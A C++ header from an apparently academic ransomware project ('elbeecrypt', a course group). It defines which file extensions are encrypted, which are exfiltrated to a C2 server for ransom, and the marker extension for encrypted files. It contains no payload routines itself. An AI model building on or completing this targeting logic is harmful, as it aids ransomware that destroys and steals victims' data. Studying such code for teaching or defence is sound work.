#pragma once

#include <map>
#include <string>
#include <vector>
#include "elbeecrypt/common/utils/container.hpp"
//Extension group imports
#include "elbeecrypt/common/targets/extgroup/archive.hpp"
#include "elbeecrypt/common/targets/extgroup/executable.hpp"

/**
 * @brief Contains groups of extensions based on a "tag" system
 * The tag system dictates how the ransomware should treat members
 * in the group. For example, extensions in the `encryptable`
 * group should be encrypted regardless of the mode the ransomware
 * is running in. This file also defines the extension that is to
 * be given to files that were hit.
 * 
 * @author CECS-378 Group 10
 * @file extensions.hpp
 */
namespace elbeecrypt::common::targets::Extensions {
	//Constants
	/**
	 * @brief The extension that is to be appended to an encrypted 
	 * file. This also controls which files the decryptor portion
	 * will attempt to decrypt by default.
	 */
	const std::string encryptedExtension = "elbeecrypt";

	//Extension group definitions
	/**
	 * @brief A list of the extensions that should be targeted by
	 * the encryption routine. These extensions are defined in
	 * separate files according to their category in the sub-
	 * directory `extgroup`.
	 */
	const std::vector<std::string> encryptable = utils::Container::concatVectors({extgroup::Archive::valuesStr()});

	/**
	 * @brief A list of extensions that map to file types that
	 * are normally small in size, eg: documents. This allows
	 * data exfiltration to be quicker, as it relies on smaller 
	 * files that are to be sent to a C2 server for ransom. If
	 * the ransomware is set to exfiltrate data, this list will
	 * be consulted. Otherwise, it is to be treated the same as
	 * any other encryptable file.
	 */
	const std::vector<std::string> exfiltratable = extgroup::Executable::valuesStr();

	/**
	 * @brief A list of the extensions that should be ignored by
	 * the ransomware. Like the `encryptable` extensions, these 
	 * are defined in `extgroup`. Unlike the encryptables, 
	 * extensions in this group should not be targeted at all
	 * regardless of the mode of the ransomware. Doing so could
	 * cause instability with the system which is not the goal.
	 */
	const std::vector<std::string> passable = {};
}